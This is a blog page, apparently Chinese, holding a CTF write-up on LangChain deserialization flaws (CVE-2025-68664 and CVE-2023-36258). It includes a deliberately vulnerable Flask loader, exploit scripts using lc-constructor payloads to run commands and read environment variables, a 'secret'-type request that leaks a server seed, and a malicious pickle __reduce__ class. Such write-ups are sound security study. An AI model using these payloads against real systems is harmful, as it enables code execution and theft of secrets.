@@ -1,0 +1,837 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      LangChain反序列化 | Su@sU的世界
+    
+  </title>
+  <meta name="author" content="Su@sU">
+  <meta name="keywords" content="web 游戏" />
+  <meta name="description" content="一个什么都感兴趣的人的胡思乱想" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'normal',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 110,
+      randomYouSrc: 'https://sariay.github.io/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「LangChain反序列化」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-zhihu"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-sina-weibo "></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-pinterest2"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2026/06/21/LangChain%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">
+		LangChain反序列化
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2026/06/21/LangChain%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">
+		<time datetime="2026-06-21T04:00:00.000Z" itemprop="dateUpdated">
+	  		2026-06-21
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+						
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<p>最近在打SCTF的时候遇到一个LangChain反序列化的题目  比较新颖 于是想着学习一下</p>
+<h2 id="LangChain介绍"><a href="#LangChain介绍" class="headerlink" title="LangChain介绍"></a>LangChain介绍</h2><p>LangChain是一个用于构建大语言模型应用的开源框架 通过这个可以把常用的组件抽象成可串联的链（Chain）<br>举个例子 假如我们现在要设计一个客服机器人 它的工作是根据用户问题搜索公司文档 然后把结果交给LLM生成回答 这一系列行动是通过LangChain实现的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索链-&gt;凭借提示词-&gt;调用AI模型-&gt;输出回答</span><br></pre></td></tr></table></figure>
+<p>同时为了提高开发效率 LangChain还提供了很多的辅助功能 其中之一就是保存和加载整个链配置 比如你已经调试好了一条链 想要存成文件下次直接使用 这就需要一个序列化机制</p>
+<h2 id="LangChain存在漏洞的设计"><a href="#LangChain存在漏洞的设计" class="headerlink" title="LangChain存在漏洞的设计"></a>LangChain存在漏洞的设计</h2><p>在低版本的LangChain之中是存在pickle反序列化漏洞的（LangChain&lt;0.0.233）这是CVE-2023-36258 于是开发者为了替代不安全的Python原生pickle 发明了一种基于JSON&#x2F;字典的序列化格式 其大致思路是这样的</p>
+<ul>
+<li>把每一个LangChain对象都表示成一个普通字典</li>
+<li>在字典之中使用一个特殊字段lc来标记“这是一个LangChain”对象 按照这一设计的协议来将其反序列化</li>
+<li>type表示调用哪个类或函数 id表示要导入的模块路径和对象名称 kwargs表示传什么参数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;lc&quot;: 1,</span><br><span class="line">  &quot;type&quot;: &quot;constructor&quot;,</span><br><span class="line">  &quot;id&quot;: [&quot;langchain_community&quot;, &quot;llms&quot;, &quot;openai&quot;, &quot;OpenAI&quot;],</span><br><span class="line">  &quot;kwargs&quot;: &#123;</span><br><span class="line">    &quot;model_name&quot;: &quot;gpt-3.5-turbo&quot;,</span><br><span class="line">    &quot;temperature&quot;: 0.7</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们来看到这一段JSON 这就是一个OpenAL的LLM对象序列化之后的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;lc&quot;: 1</span><br></pre></td></tr></table></figure>
+<p>这是LangChain协议的身份标识 反序列化器（loads）识别到字典之中存在lc并且其值等用途1的时候就指导需要按照LangChain协议恢复它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;type&quot;: &quot;constructor&quot;</span><br></pre></td></tr></table></figure>
+<p>这一段的作用是告诉反序列化器使用那种方式重建对象<br>这里使用的<code>constructor</code>是最常见的类型 用于动态导入一个可调用对象 然后使用<code>kwargs</code>作为参数调用它 返回结果就是原始对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;id&quot;: [&quot;langchain_community&quot;, &quot;llms&quot;, &quot;openai&quot;, &quot;OpenAI&quot;]</span><br></pre></td></tr></table></figure>
+<p>前面的<code>langchain_community</code>，<code>llms</code>，<code>openal</code>会被使用<code>.</code>号连接起来 写成模块路径<code>langchain_community.llms.openai</code><br>最后这一段内容就会被解释成<code>from langchain_community.llms.openai import OpenAI</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;kwargs&quot;: &#123;</span><br><span class="line">    &quot;model_name&quot;: &quot;gpt-3.5-turbo&quot;,</span><br><span class="line">    &quot;temperature&quot;: 0.7</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这一段内容就比较好理解了 这就是传给构造函数的关键字参数 反序列化器拿到OpenAI后 会这样调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenAI(model_name=&quot;gpt-3.5-turbo&quot;, temperature=0.7)</span><br></pre></td></tr></table></figure>
+<p>从而原封不动的重建出哪个LLM配置对象 </p>
+<p>这个机制本身没有什么问题 问题出在 它对所有带有lc键的字典一视同仁 并没有严格区分这个字典是LangChain自己生成的还是来自用户输入的普通·数据</p>
+<h2 id="LangChain反序列化漏洞如何产生"><a href="#LangChain反序列化漏洞如何产生" class="headerlink" title="LangChain反序列化漏洞如何产生"></a>LangChain反序列化漏洞如何产生</h2><p>关于LangChain 目前有两个已知的漏洞</p>
+<h2 id="CVE-2025-68664"><a href="#CVE-2025-68664" class="headerlink" title="CVE-2025-68664"></a>CVE-2025-68664</h2><p>这是本篇文章主要研究的漏洞 在高版本的LangChain之中 由于修复了前者 我们考虑使用LangChain自己的协议来攻击自己</p>
+<p>漏洞点存在于<code>langchain-core</code>的<code>dumps()/dumpd()</code>函数之中 这些函数本来是用来将LangChain对象转换成JSON&#x2F;字典的 但是当题目处理一个由用户传入的自由格式字典的时候 不会讲字典里可能存在的lc键做任何转义或隔离<br>又由于我们之前提到 这个机制对所有带有lc的JSON一视同仁 会将这些JSON字典当成合法的LangChain对象来重建 从而执行攻击者指定的任意Python函数或类构造函数 导致远程代码执行或者信息泄露</p>
+<p>比如说是这样一个处理结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_data = request.get_json()</span><br><span class="line">serialized = dumps(user_data)   # 注意：user_data 里可能有 &#123;&quot;lc&quot;:1,...&#125;</span><br><span class="line"># 存到数据库...</span><br><span class="line"># 后来加载：</span><br><span class="line">obj = loads(serialized)         # 此处会触发恶意构造的对象加载！</span><br></pre></td></tr></table></figure>
+<p>这个漏洞的本质原因就是协议控制字段lc和用户数据共用同一个命名空间 并且序列化函数未对用户数据进行净化 导致的信任边界混淆</p>
+<h3 id="68664漏洞简单复现"><a href="#68664漏洞简单复现" class="headerlink" title="68664漏洞简单复现"></a>68664漏洞简单复现</h3><p>由于我的python版本太高了 直接安装LangChain会出现不兼容的问题<br>这里我选择手动编写一个和LangChai-core里面的loadd函数相同的函数就行</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>首先创建文件夹<code>langchain_lab</code><br>使用python创建一个虚拟环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m venv venv  //这一步创建环境 第二个venv是虚拟环境名称</span><br><span class="line">venv\Scripts\activate  //这一步是进入虚拟环境</span><br></pre></td></tr></table></figure>
+<p>接下来要给虚拟环境安装我们需要的模块<br>在这里使用request和Flask就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask</span><br><span class="line">pip install requests</span><br></pre></td></tr></table></figure>
+<p>那么现在我们为了模拟LangChain的机制 需要手动编写一个loadd函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">from flask import Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># ---------------- 模拟 langchain 的 loadd 函数 ----------------</span><br><span class="line">def loadd(obj):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    和真实有漏洞的 langchain_core.load.loadd 行为一致：</span><br><span class="line">    - 如果 obj 是字典且包含 lc==1，就把它当作 LangChain 对象重建。</span><br><span class="line">    - type==&quot;constructor&quot; 时，根据 id 动态导入模块并调用，传入 kwargs。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if isinstance(obj, dict) and obj.get(&quot;lc&quot;) == 1:</span><br><span class="line">        if obj.get(&quot;type&quot;) == &quot;constructor&quot;:</span><br><span class="line">            id_list = obj[&quot;id&quot;]</span><br><span class="line">            module_path = &quot;.&quot;.join(id_list[:-1])   # 如 &quot;os&quot;</span><br><span class="line">            attr_name = id_list[-1]                # 如 &quot;system&quot;</span><br><span class="line">            mod = importlib.import_module(module_path)</span><br><span class="line">            func = getattr(mod, attr_name)</span><br><span class="line">            kwargs = obj.get(&quot;kwargs&quot;, &#123;&#125;)</span><br><span class="line">            return func(**kwargs)</span><br><span class="line">        # 这里可以添加其他 type 的处理，但为了实验只演示 constructor</span><br><span class="line">    return obj  # 普通字典，原样返回</span><br><span class="line"></span><br><span class="line"># ---------------- 服务端接口 ----------------</span><br><span class="line">@app.route(&#x27;/api/config&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def load_config():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    # 危险：直接把用户 JSON 传给 loadd</span><br><span class="line">    result = loadd(data)</span><br><span class="line">    return jsonify(&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: str(result)&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True, host=&#x27;127.0.0.1&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+<p>那么漏洞函数和服务端就扣都写好了 直接使用python打开即可<br>看到<code>Running on http://127.0.0.1:5000</code>就说明启动成功 保持这个终端打开<br> 再开一个终端 同样激活虚拟环境<br>创建一个攻击脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:5000/api/config&quot;</span><br><span class="line"></span><br><span class="line"># 恶意 payload：在 D:\langchain_lab 下创建 pwned.txt</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;lc&quot;: 1,</span><br><span class="line">    &quot;type&quot;: &quot;constructor&quot;,</span><br><span class="line">    &quot;id&quot;: [&quot;subprocess&quot;, &quot;check_output&quot;],</span><br><span class="line">    &quot;kwargs&quot;: &#123;</span><br><span class="line">        &quot;args&quot;: [&quot;cmd&quot;, &quot;/c&quot;, &quot;echo Su@sU &gt; D:\\langchain_lab\\pwned.txt&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url, json=payload)</span><br><span class="line">print(&quot;Response:&quot;, resp.json())</span><br></pre></td></tr></table></figure>
+<p>我们传入地方payload里面定义了<code>subprocess.check_output(args=[&quot;cmd&quot;, &quot;/c&quot;, &quot;echo ...&quot;])</code> 在 Windows 上执行命令 命令内容是吧Su@sU写入pwned.txt之内<br>在终端执行这个攻击脚本就会发现文件pwned.txt生成在目录之中 并且写入了Su@sU了<br>整个简单模拟完成</p>
+<h4 id="读取环境变量"><a href="#读取环境变量" class="headerlink" title="读取环境变量"></a>读取环境变量</h4><p>在这道题目之中我们需要读取环境变量之中的<code>SHOP_SUPPORT_SEED</code><br>那么我们同样的来模拟一下读取环境变量之中规定内容应该如何操作<br>将exploit.py之中的内容修改成这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;lc&quot;: 1,</span><br><span class="line">    &quot;type&quot;: &quot;constructor&quot;,</span><br><span class="line">    &quot;id&quot;: [&quot;os&quot;, &quot;getenv&quot;],</span><br><span class="line">    &quot;kwargs&quot;: &#123;&quot;key&quot;: &quot;PATH&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最核心就是描述导入os模块的getenv函数<br>等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from os import getenv</span><br></pre></td></tr></table></figure>
+<p>由于<code>os.getenv(key, default=None)</code> 所以我们需要在参数之中传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kwargs&quot;: &#123;&quot;key&quot;: &quot;PATH&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>这样一来就会变成<br><code>getenv(key=&quot;PATH&quot;)</code> 于是返回系统环境变量的值</p>
+<p>我们再回过头看这道SCTF上的web shop<br>查看前端js代码可以看到这样的构造逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function ge(e, t) &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    source: t ? &quot;asset-probe&quot; : &quot;chat-sync&quot;,</span><br><span class="line">    client: &quot;web-shop&quot;,</span><br><span class="line">    ts: Date.now(),</span><br><span class="line">    messages: t</span><br><span class="line">      ? [&#123;</span><br><span class="line">          lc: 1,</span><br><span class="line">          type: &quot;constructor&quot;,</span><br><span class="line">          id: [&quot;langchain_core&quot;, &quot;messages&quot;, &quot;SystemMessage&quot;],</span><br><span class="line">          kwargs: &#123; content: &quot;Support replay context initialized.&quot; &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">      : [&#123; type: &quot;text&quot;, content: e &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以了解到这个是LangChain反序列化的形式<br>这道题中文名可以向机器人发起对话 也符合LangChain这个和AI息息相关的框架<br>那么我们可以向机器人发出自己构造的带有lc标识的JSON 用以实现我们的目的<br>在这里我们需要算出staff code 而staff code的计算需要环境变量之中的SHOP_SUPPORT_SEED 那么我们就可以了LangChain反序列化的方式获得环境变量之中的这个值</p>
+<p>我们需要知道除了使用os.getnev的方式之外 我们还有别的更简单 更不容易被发现的方式获取环境变量<br>这里利用<code>secret</code>类型 ：在LangChain之中 一些敏感配置不会明文卸载序列化结果里面 而是用一个secret引用 指向环境变量 反序列化的时候 <code>secret</code>类型会自动从<code>os.environ</code>之中读取对应键之中的值<br>那么我们就可以这么构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;probe&quot;: &#123;</span><br><span class="line">  &quot;lc&quot;: 1,</span><br><span class="line">  &quot;type&quot;: &quot;secret&quot;,</span><br><span class="line">  &quot;id&quot;: [&quot;SHOP_SUPPORT_SEED&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以先正常登录获取token之后 利用bp发送以下JSON内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /api/chat/messages</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer &lt;你的token&gt;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;content&quot;: &quot;probe&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;source&quot;: &quot;chat-sync&quot;,</span><br><span class="line">    &quot;client&quot;: &quot;web-shop&quot;,</span><br><span class="line">    &quot;ts&quot;: 1234567890,</span><br><span class="line">    &quot;probe&quot;: &#123;</span><br><span class="line">      &quot;lc&quot;: 1,</span><br><span class="line">      &quot;type&quot;: &quot;secret&quot;,</span><br><span class="line">      &quot;id&quot;: [&quot;SHOP_SUPPORT_SEED&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;messages&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;hello&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后端处理这个metadata的时候 内部的loadd函数遇到probe字段 并发现lc&#x3D;1且type&#x3D;secret的时候 就会执行<code>os.environ[&quot;SHOP_SUPPORT_SEED&quot;]</code> 并用返回的字符串替换probe字段的值 此时当再次请求获取聊天记录的时候 返回的metadara.probe<br>就不再是那个字典 而是变成了实际的种子字符串 我们就获取了环境变量之中的这个值</p>
+<h2 id="CVE-2023-36258"><a href="#CVE-2023-36258" class="headerlink" title="CVE-2023-36258"></a>CVE-2023-36258</h2><p>这个漏洞是直接使用pickle反序列化来完成 由于早期版本的<code>LangChain.chains.loading</code>模块之中 <code>load_chain()</code>函数直接使用了Python原生的pickle.load()来加载用户提供的文件 就会产生这一漏洞</p>
+<h3 id="存在漏洞的设计"><a href="#存在漏洞的设计" class="headerlink" title="存在漏洞的设计"></a>存在漏洞的设计</h3><p>LangChain的核心是链 用户可能会话很长时间调试一个复杂的链（搜文档——提取关键信息——调用LLM——格式化输出）那么自然 当用户调试好之后就想将这个链保存到文件 下次就能直接加载使用<br>于是LangChain设计了一个函数：<code>load_chain(path)</code>其设计初衷就是为了给定一个文件路径 把文件内容反序列化成一个直接可用的Chain对象<br>那么这时候 Python原生支持 能序列化几乎任何Python对象的pickle就显得很好用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">def load_chain(path: str):</span><br><span class="line">    with open(path, &quot;rb&quot;) as f:</span><br><span class="line">        return pickle.load(f)   # 直接反序列化</span><br></pre></td></tr></table></figure>
+<p>上述代码定义了一个<code>load_chain</code>函数 这个函数接收一个参数类型提示未字符串的参数path<br>之后以二进制只读模式打开path指定的文件 并使用<code>pickle.load(f)</code>从文件对象f之中读取二进制字节流 将其还原成原始的Python对象</p>
+<p>但是这样设计隐含了一个致命的问题 其假设：被加载的文件是用户自己保存的 安全可信的<br> 然而LangChain作为一个框架 它的<code>load_chain</code>函数很可能被开发者用在服务端 接收来自最终用户上传的文件 攻击者就可以构造恶意的pickle文件让服务器加载</p>
+<h3 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h3><p>这里运用的漏洞产生原理其实也就是pickle反序列化的原理<br>pickle反序列化特殊之处在于它保存的是一串操作码 类似于指令 告诉反序列化器一步步一个怎么做</p>
+<p>最核心部分在于<code>__reduce__</code>方法<br>当一个对象定义了reduce方法 pickle会在序列化的时候调用它 这个方法应当返回一个元组（callable，args）当反序列化的时候 <code>pickle.load</code>会执行<code>callable(*args)</code><br>那么我们就可以定义一个类 让他的<code>__reduce__</code>返回危险函数和恶意参数 然后讲这一对象序列化成文件<br>就比如这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Evil:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system, (&#x27;echo Su@sU&#x27;,))</span><br><span class="line"></span><br><span class="line">with open(&quot;evil.pkl&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    pickle.dump(Evil(), f)</span><br></pre></td></tr></table></figure>
+<p>那么当以上序列化数据被反序列化的时候 就会执行<code>os.system(&#39;echo Su@sU&#39;)</code> 这样一来就会导致恶意代码执行</p>
+<p>这个漏洞的利用就是pickle反序列化漏洞的利用逻辑 再次不做过多赘述</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/images/covers/%E5%B9%B3%E6%B1%9F%E8%B7%AF.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2026/04/19/%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/" title="死亡绕过" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/04/19/%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/" title="死亡绕过">
+								死亡绕过			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 19日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前言以及环境介绍本文是对p神文章谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌知识点的学习
+本文主要介绍使用filter伪协议进行死亡绕过的三种方式
+测试环境：小皮面板测试代码：exit.php
+12345&lt...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/04/19/%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/" title="死亡绕过">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/南京街景.jpg" alt="死亡绕过"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
